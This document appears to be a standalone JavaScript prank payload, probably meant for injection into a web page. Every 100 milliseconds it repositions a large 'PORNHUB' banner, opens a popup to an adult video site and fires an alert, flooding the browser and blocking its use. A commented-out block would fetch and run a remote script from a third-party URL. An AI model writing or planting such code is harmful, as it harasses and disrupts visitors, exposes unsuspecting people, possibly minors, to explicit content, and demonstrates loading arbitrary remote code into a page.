let parent = document.createElement("div");
parent.innerText = 'PORNHUB';
parent.style.color = "red";
parent.style.position = "absolute";
parent.style.fontSize = "80px";
parent.style.zIndex = "100";
parent.style.display = "inline-block";
setInterval(() => {
    parent.style.top = `${Math.floor((Math.random() * window.innerHeight + window.pageYOffset) + window.pageYOffset)}px`;
    parent.style.left = `${Math.floor((Math.random() * window.innerWidth + window.pageXOffset) + window.pageXOffset)}px`;
    window.open("https://www.xvideos.com/", "", "width=300,height=200");
    alert("PORNHUB");
    document.body.appendChild(parent);
}, 100);
//   var script = document.createElement('script');
// script.type = 'text/javascript';
//  script.src = 'https://rawgit.com/ErrorTank/KappaSocial/master/test.js';
//  document.head.appendChild(script);
